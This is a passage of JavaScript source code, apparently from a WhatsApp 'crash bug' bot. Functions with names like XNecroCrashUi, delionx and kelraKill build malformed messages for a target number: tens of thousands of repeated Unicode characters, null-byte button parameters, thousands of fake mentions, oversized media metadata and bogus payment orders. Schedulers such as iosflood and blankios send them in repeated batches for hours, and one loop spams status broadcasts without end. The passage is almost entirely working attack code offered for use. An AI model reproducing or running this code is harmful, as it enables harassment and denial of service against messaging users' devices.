            "ꦾ".repeat(10000),
        },
      },
    }, {});

    await sock.relayMessage(X, msg1.message, { messageId: msg1.key.id });
    await sleep(500);

    const msg2 = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamJson: "\u0000".repeat(25000),
                },
                {
                  name: "cta_url",
                  buttonParamJson: JSON.stringify({
                    displayText: "Traz MobaX🌹‌‌" + "ꦾ".repeat(5000),
                  }),
                },
                {
                  name: "cta_call",
                  buttonParamJson: JSON.stringify({
                    displayText: "Traz MobaX🌹‌‌" + "ꦾ".repeat(5000),
                  }),
                },
                {
                  name: "cta_copy",
                  buttonParamJson: "\u0000".repeat(25000),
                },
              ],
            },
            contextInfo: {
              remoteJid: X,
              participant: X,
              mentionedJid: [
                X,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: sock.generateMessageTag(),
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net",
              },
            },
          },
        },
      },
    }, {});

    await sock.relayMessage(X, msg2.message, { messageId: msg2.key.id });

    const msg3Content = {
      message: {
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
          fileLength: 99999999999999,
          seconds: 99999999999999,
          ptt: true,
          mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
          fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
          directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
          mediaKeyTimestamp: 99999999999999,
          contextInfo: {
            mentionedJid: [
              X,
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
              ),
            ],
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363375427625764@newsletter",
              serverMessageId: 1,
              newsletterName: "🌹",
            },
          },
          waveform:
            "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==",
        },
      },
    };

    while (true) {
      const msg3 = generateWAMessageFromContent("status@broadcast", msg3Content, {});
      await sock.relayMessage("status@broadcast", msg3.message, {
        messageId: msg3.key.id,
      });

      // tambahan dari CrashAndroidInvisible
      const extraContent = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "⎋Traz MobaX🌹‌‌".repeat(200000) },
              footer: {
                text: "RIMURU SKIBIDI SIGMA" + "¿".repeat(200000),
              },
              header: {
                title: "X",
                hasMediaAttachment: true,
              },
              contextInfo: {},
            },
          },
        },
      };

      await sock.relayMessage("status@broadcast", generateWAMessageFromContent("status@broadcast", extraContent, {}).message, {
        messageId: null,
      });

      await sleep(150);
    }
  } catch (err) {
    console.error("Error:", err);
  }
}


async function rimXs(X, sock) {
  try {
    // Ambil thumbnail dari URL
    const { data } = await axios.get("https://files.catbox.moe/i236nc.png", {
      responseType: "arraybuffer"
    });
    const thumb = Buffer.from(data, "binary");

    // Pesan 1 (interactiveMessage)
    const v220 = {
      key: {
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: thumb
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "review_and_pay",
                buttonParamsJson: JSON.stringify({
                  currency: "IDR",
                  total_amount: { value: 49981399788, offset: 100 },
                  reference_id: "4OON4PX3FFJ",
                  type: "physical-goods",
                  order: {
                    status: "payment_requested",
                    subtotal: { value: 49069994400, offset: 100 },
                    tax: { value: 490699944, offset: 100 },
                    discount: { value: 485792999999, offset: 100 },
                    shipping: { value: 48999999900, offset: 100 },
                    order_type: "ORDER",
                    items: [
                      {
                        retailer_id: "7842674605763435",
                        product_id: "7842674605763435",
                        name: "️VinzaIs1st",
                        amount: { value: 9999900, offset: 100 },
                        quantity: 7
                      },
                      {
                        retailer_id: "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8",
                        name: "",
                        amount: { value: 999999900, offset: 100 },
                        quantity: 49
                      }
                    ]
                  },
                  native_payment_methods: []
                })
              }
            ]
          }
        }
      }
    };

    // Pesan 2 (requestPhoneNumberMessage)
    const message1 = {
      requestPhoneNumberMessage: {
        contextInfo: {
          businessMessageForwardInfo: {
            businessOwnerJid: "13135550002@s.whatsapp.net"
          },
          stanzaId: "rimXs-Id" + Math.floor(Math.random() * 99999),
          forwardingScore: 100,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780349272@newsletter",
            serverMessageId: 1,
            newsletterName: "newsletter_sample"
          },
          mentionedJid: [
            "13135550002@s.whatsapp.net",
            "12345@s.whatsapp.net"
          ],
          annotations: [
            {
              embeddedContent: {
                type: "hi bang, liat nih kwkwkw",
                text: "dummy"
              },
              embeddedAction: true
            }
          ]
        }
      }
    };

    // Kirim pesan ke X X
    await sock.relayMessage(X, v220.message, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "null - execute" },
          content: undefined
        }
      ]
    });

    await sock.relayMessage(X, message1);

    console.log("✅ Pesan berhasil dikirim ke:", X);
  } catch (err) {
    console.error("❌ Gagal kirim:", err.message);
  }
}

async function ripXs(X) {
  const v220 = {
    key: {
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast"
    },
    message: {
      interactiveMessage: {
        header: {
          hasMediaAttachment: true,
          jpegThumbnail:
 "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAAAAgMEAQUBAQADAQAAAAAAAAAAAAAAAAUCAwQB/9oADAMBAAIQAxAAAADQBgiiyUpiMRT3vLsvN62wHjoyhr2+hRbQgh10QPSU23aa8mtJCxAMOwltmOwUV9UCif/EACAQAAICAQQDAQAAAAAAAAAAAAECAAMRBBASQSAhMTL/2gAIAQEAAT8A87dRXUQD9MR1sGR4U1VW2O7DLAwoqWMF3uc1oSBNAHBsdgfYlFhNjqd9R+FUdypVFSLKqqxa7Be5cvFztYpZlz1FxGbg2RLWD8W2tOBFsyoxMl3Ajn2AOttSwAEV5QQQzb6wkcIbSBK7XxgGD4J//8QAIhEBAAICAQIHAAAAAAAAAAAAAQACAxIhBBAREyMxUWGS/9oACAECAQE/AJrYNvDjtWrZAmWvop8HbpdRss45mauuSxMAv7JYNWXs2srOnXzaH3GPuz//xAAiEQACAQMEAgMAAAAAAAAAAAABAgADERIEECExE2EkMlH/2gAIAQMBAT8AmDBcsTb92RWdgqjmV0+MVA6G2jsM2l7SuuNVx7lAHD0XWfbiVGLuzGadj5EW/F9j2Z//2Q==",
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️VinzaIs1st\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }
          ]
        }
      }
    }
  };

  const message1 = {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "rimXs-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "newsletter_sample" // jangan terlalu panjang
        },
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          "12345@s.whatsapp.net" // contoh tambahan
        ],
        annotations: [
          {
            embeddedContent: {
              type: "hi bang, liat nih kwkwkw",
              text: "dummy"
            },
            embeddedAction: true
          }
        ]
      }
    }
  };

  await sock.relayMessage(X, v220.message, {
    additionalNodes: [{
      tag: "meta",
      attrs: { is_status_mention: " null - exexute " },
      content: undefined
    }]
  });

  await sock.relayMessage(X, message1);

  console.log("Pesan berhasil dikirim ke:", X);
}

async function delionx(X) {
  try {
    const payload = 'HAII Im DANDELION🫀' + '𑇂𑆵𑆴𑆿'.repeat(1500) + 'ꦾ'.repeat(1500);
    await sock.sendMessage(X, { text: payload });

    const s = "THIS DANDELION".repeat(9999);

    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + "ꦾ".repeat(1599),
      address: "\u0000" + "ꦾ".repeat(1599),
      url: `https://xnxx.${"𑇂𑆵𑆴𑆿".repeat(5000)}.com`,
    };

    let msg = generateWAMessageFromContent(
      X,
      {
        viewOnceMessage: {
          message: { locationMessage },
        },
      },
      {}
    );

    let extendMsg = {
      extendedTextMessage: {
        text: "༚ ./rimuruxs.   𑇂𑆵𑆴𑆿" + s,
        matchedText: "༚ ./rimuruxs.   𑇂𑆵𑆴𑆿",
        description: "ꦾ".repeat(1777),
        title: " ./bang.   𑇂𑆵𑆴𑆿" + "ꦾ".repeat(1560),
        previewType: "NONE",
        jpegThumbnail:
          "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",
        thumbnailDirectPath:
          "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    };

    await sock.relayMessage(X, msg.message, { messageId: msg.key.id });
    await sock.sendMessage(X, extendMsg);
  } catch (e) {
    console.log("Error delionx:", e);
  }
}


async function XNecroCrashUi(X) {
  await sock.relayMessage(X, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦾ".repeat(60000),
            locationMessage: {
              degreesLatitude: 0,
              degreesLongtitude: 0,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "𒑡𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚" + "ោ៝".repeat(20000),
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: ""
              },
              {
                name: "call_permission_request",
                buttonParamsJson: ""
              },
            ],
          },
        },
      },
    },
  }, {});
  
  await sock.relayMessage(X, {
    groupInviteMessage: {
      inviteCode: "XxX",
      inviteExpiration: "18144000",
      groupName: "𒑡𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚" + "ោ៝".repeat(20000),
      caption: "ោ៝".repeat(20000),
    },
  }, { participant: { jid: X }, });
}

async function XNecroCrashCrL(X) {
  const CardsX = [];
  
  for (let i = 0; i < 100; i++) {
    CardsX.push({
    body: {
      text: "𒑡𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚"
    },
    header: {
      title: "",
      imageMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "9999999999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
        },
        hasMediaAttachment: true,
      },
      nativeFlowMessage: {
        messageParamsJson: "{}",
        buttons: [
  {
    name: "order_details",
    buttonParamsJson: "",
  },
  {
    name: "review_order",
    buttonParamsJson: "",
  },
        ],
      },
    });
  }
  
  const msg = await generateWAMessageFromContent(
    X,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetaData: {},
            deviceListMetaDataVersion: 2,
          },
          interactiveMessage: {
            body: {
              text: "𒑡𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚",
            },
            footer: {
              text: "ោ៝".repeat(20000),
            },
            carouselMessage: {
              CardsX,
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              isForwaded: true,
              isForwadingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: X,
              },
            },
          },
        },
      },
    },
    {}
  );
  
  await sock.relayMessage(X, msg.message, {
    messageId: msg.key.id,
    participant: { jid: X },
  });
}


async function kelraKill(X) {
  sock.relayMessage(
    X,
    {
      viewOnceMessage: {
        message: {
          extendedTextMessage: {
            text:"🚯⃟⃑.im Dandelion Kill you" + "ۗۗۗۿۗۗۗۯۗۗۗۗۗۿۗۗۗۯۗۗۗۗۗ".repeat(8000),
            contextInfo: {
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [{
                        jid: "0@s.whatsapp.net",
                        callOutcome: "1"
                    }]
                }
              }
            }
          }
        }
      }
    },
    {
      participant: { jid: X }
    }
  );
    console.log('sukses');
}



async function GetSuZoXAndros(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 8) {
        await Promise.all([
        BadzzDelay(sock, X),
           await sleep(500)
           ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/8 Andros 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade X-SILENT 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function blank(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 4) {
        await Promise.all([
        BadzzDelay(sock, X),
            await sleep(500)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/2 blank 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 3500);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade X-SILENT 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function fc(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 5) {
        await Promise.all([
        BadzzDelay(sock, X),
            await sleep(500),
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/10 blankios 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 6000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade X-SILENT 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function blankios(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 2) {
        await Promise.all([
          
            BadzzDelay(sock, X),
            await sleep(500)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/1 blankios 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 3500);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade X-SILENT 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}



async function iosflood(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 2) {
        await Promise.all([
          BadzzDelay(sock, X),
            await sleep(500)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 IOS🕊️
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade X-SILENT 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
